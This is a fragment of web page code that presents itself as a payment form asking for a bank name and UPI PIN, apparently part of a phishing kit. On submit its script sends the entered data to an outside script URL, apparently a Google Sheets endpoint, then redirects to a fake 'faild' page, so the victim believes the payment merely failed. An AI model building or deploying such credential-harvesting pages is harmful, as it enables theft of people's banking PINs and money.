...
<div class="container">
   ...
   <label for="email"><b>Bank Name *</b></label>
    <input type="text" placeholder="Enter Bank Name" name="namebnk" autocomplete="off" required>

    <label for="psw-repeat"><b>UPI Pin *</b></label>
    <input type="number" placeholder="Enter Upi Pin" name="upi-pin" autocomplete="off" required>
    ...
    <button type="submit" class="registerbtn">Pay</button>
  </div>
            ...
            const form = document.forms['google-sheet']
             ...
             form.addEventListener('submit', e => {
               ...
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response =>  window.location.href='faild.php')
